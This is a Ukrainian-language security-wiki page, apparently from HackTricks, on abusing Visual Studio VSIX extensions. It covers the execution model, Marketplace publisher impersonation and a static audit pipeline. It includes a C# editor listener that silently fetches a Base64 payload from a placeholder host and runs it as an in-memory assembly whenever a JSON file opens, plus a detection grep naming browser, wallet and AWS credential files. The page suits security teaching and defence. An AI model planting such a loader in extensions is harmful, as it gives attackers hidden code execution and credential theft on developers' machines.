# Зловживання розширеннями Visual Studio VSIX

{{#include ../banners/hacktricks-training.md}}

Розширення Visual Studio може перетворити звичайну роботу в редакторі на виконання коду від імені користувача, який увійшов у систему. Шкідливий VSIX, видавець-двійник або скомпрометоване оновлення розширення можуть дістатися до цього користувача через звичайні канали встановлення. Встановлення з запитом адміністратора — це шлях інсталяції, що потребує згоди, а не автоматичне підвищення привілеїв.<sup>[[1]](#references)</sup>

## Модель виконання

Розширення на базі класичного VSSDK зазвичай виконуються всередині `devenv.exe`. Нова модель `VisualStudio.Extensibility` переважно запускає сучасні розширення .NET поза процесом: Visual Studio передає виклики спеціальному процесу `Microsoft.ServiceHub.Host.Extensibility`, ізолюючи стабільність IDE, але **не** обмежуючи розширення пісочницею від дозволів користувача Windows. Точна назва виконуваного файла може містити суфікс архітектури, наприклад `ServiceHub.Host.Extensibility.arm64.exe`.<sup>[[1]](#references)[[2]](#references)</sup>

### Запуск під час звичайної роботи в редакторі

Замість того щоб надавати лише помітну команду меню, розширення може реалізувати `ITextViewOpenClosedListener`. Його зворотний виклик `TextViewOpenedAsync` запускається для відповідних документів, а `TextViewExtensionConfiguration.AppliesTo` може обмежити активацію поширеним типом, наприклад JSON. Справжній форматер або linter усе ще може виконувати заявлену роботу, тоді як друга дія запускається побічно під час відкриття файла.<sup>[[1]](#references)[[3]](#references)</sup>

Наведений нижче скорочений шаблон показує важливі точки виконання; для ясності в ньому не наведено легітимний форматер і обробку помилок.<sup>[[1]](#references)[[3]](#references)</sup>

<details>
<summary>Завантажувач керованої збірки в пам’яті, що запускається подією</summary>

```csharp
[VisualStudioContribution]
internal class JsonListener : ExtensionPart, ITextViewOpenClosedListener
{
    public TextViewExtensionConfiguration TextViewExtensionConfiguration => new()
    {
        AppliesTo = [DocumentFilter.FromDocumentType("json")]
    };

    public async Task TextViewOpenedAsync(ITextViewSnapshot view, CancellationToken ct)
    {
        using var http = new HttpClient();
        var encoded = (await http.GetStringAsync("https://example.invalid/update.txt", ct)).Trim();
        using var stream = new MemoryStream(Convert.FromBase64String(encoded));
        var context = new AssemblyLoadContext(Guid.NewGuid().ToString(), isCollectible: true);
        var entry = context.LoadFromStream(stream).EntryPoint
            ?? throw new InvalidOperationException("Assembly has no entry point");
        var argv = entry.GetParameters().Length == 0 ? null : new object?[] { Array.Empty<string>() };
        if (entry.Invoke(null, argv) is Task task) await task;
        context.Unload();
    }

    public Task TextViewClosedAsync(ITextViewSnapshot view, CancellationToken ct)
        => Task.CompletedTask;
}
```

</details>

Цей ланцюжок завантажує текст Base64, декодує його в байти assembly, завантажує їх із `MemoryStream` через collectible `AssemblyLoadContext`, викликає відображену `EntryPoint` без параметрів або з `string[]`, очікує завершення асинхронних точок входу та вивантажує контекст. Другий етап не записується на диск, хоча VSIX і основна DLL розширення залишаються артефактами на диску. Base64 не забезпечує автентичності чи конфіденційності; використання HTTP також дає змогу зловмиснику, який має доступ до каналу зв’язку, підмінити відповідь.<sup>[[1]](#references)</sup>

Серед операційних варіантів — придушення всіх винятків, щоб заявлена функція продовжувала працювати, якщо етап завантаження не вдасться, або використання `ITextViewChangedListener` для запуску після редагування. Код виконується в хості розширень і може використовувати доступні цьому користувачеві керовані API, P/Invoke, файли, облікові дані та дочірні процеси.<sup>[[1]](#references)</sup>

Інформацію про пов’язану з конкретним редактором поверхню виконання, що базується на автоматичному завантаженні нативних плагінів, див. тут:

{{#ref}}
windows-local-privilege-escalation/notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Зловживання довірою до Marketplace і каналів доставки

VSIX може надійти як файл, поширений напряму або через фішинг, із вебверсії Marketplace або через вбудований у Visual Studio браузер Marketplace. Реєстрація видавців, яка переважно забезпечує унікальність і перевіряє список зарезервованих слів, може дозволити створювати візуально оманливі ідентичності видавців; компрометація вже довіреного видавця або розширення ще ефективніша, оскільки дає доступ до вже наявної бази користувачів. Під час встановлення з Marketplace запускається Visual Studio Installer, а завантажений VSIX тимчасово розміщується в `%LOCALAPPDATA%\Temp`; `payload.vsix` також використовується легітимно, тому сама лише назва файлу не є індикатором.<sup>[[1]](#references)</sup>

MDSec не виявила протоколу URL Visual Studio, який безпосередньо встановлював би розширення. Оператору все одно потрібно, щоб користувач встановив VSIX і довірився йому, або слід скомпрометувати канал доставки наявного розширення. Пакет `AllUsers` встановлюється в папку інсталяції Visual Studio і може запитувати підвищення прав, але це звичайна поведінка інсталятора за згодою користувача, а не автоматичний спосіб отримати права адміністратора чи SYSTEM.<sup>[[1]](#references)[[4]](#references)</sup>

### Статичний аудит у масштабі

Пакети VSIX зазвичай є ZIP-контейнерами, тому безпечний конвеєр перевірки Marketplace може перераховувати пакети, розпаковувати їх **без завантаження коду розширення**, аналізувати маніфести, визначати поверхні виконання та декомпілювати керовані збірки за допомогою `ilspycmd`. Після виключення поширених вбудованих залежностей пріоритезуйте збірки, що належать розширенням, а потім зіставляйте рядки, пов’язані зі сховищами облікових даних, із поведінковими кластерами, такими як читання файлів разом із надсиланням даних мережею, кодування разом із надсиланням, завантаження разом із виконанням, доступ до диспетчера облікових даних разом із мережевим доступом або створення знімків екрана разом із надсиланням.<sup>[[1]](#references)[[5]](#references)</sup>

```bash
unzip -q sample.vsix -d sample-vsix
find sample-vsix -type f \( -iname '*.dll' -o -iname '*.exe' \) -print
ilspycmd -p -o decompiled sample-vsix/path/to/extension.dll
rg -n -i 'Login Data|logins\.json|key4\.db|wallet\.dat|\.aws[/\\]credentials|LoadFromStream|EntryPoint|cmd\.exe' decompiled
```

Також перевіряйте native DLLs, MSBuild targets, scripts, T4 templates і payloads інсталяторів, а не припускайте, що всі поверхні виконання — це managed code. Порівнюйте підозрілу поведінку із заявленим у маніфесті призначенням; телеметрія та легітимні програми оновлення можуть нагадувати exfiltration або staging. Перевірка лише статичним аналізом не виявляє упакований, обфускований, динамічно розв’язуваний і сплячий код, а перевірка лише найновішої версії не виявляє шкідливі попередні випуски.<sup>[[1]](#references)</sup>

VS Code використовує інший extension host і маніфест. Про writable share, який використовується для автоматичного встановлення розширення VS Code, див. [Виконання через writable share для розширення VS Code](vscode-extension-abuse.md).

Окрема атака під час завантаження проєкту може виконати шкідливий [таргет MSBuild `GetFrameworkPaths`](visual-studio-project-msbuild-execution.md) без встановлення VSIX.<sup>[[6]](#references)</sup>

## References

- [1] [MDSec — Повторний аналіз розширень Visual Studio](https://www.mdsec.co.uk/2026/05/visual-studio-extensions-revisited/)
- [2] [Microsoft Learn — Про VisualStudio.Extensibility](https://learn.microsoft.com/en-us/visualstudio/extensibility/visualstudio.extensibility/visualstudio-extensibility?view=visualstudio)
- [3] [Microsoft Learn — ITextViewOpenClosedListener.TextViewOpenedAsync](https://learn.microsoft.com/en-us/dotnet/api/microsoft.visualstudio.extensibility.editor.itextviewopenclosedlistener.textviewopenedasync?view=vs-extensibility)
- [4] [Microsoft Learn — Структура пакета VSIX](https://learn.microsoft.com/en-us/visualstudio/extensibility/anatomy-of-a-vsix-package?view=visualstudio)
- [5] [ILSpy — Інструмент .NET ilspycmd](https://github.com/icsharpcode/ILSpy/blob/master/ICSharpCode.ILSpyCmd/README.md)
- [6] [Unit 42 — Кампанія Blinder Tunnel атакує інфраструктуру Іраку](https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/)
{{#include ../banners/hacktricks-training.md}}
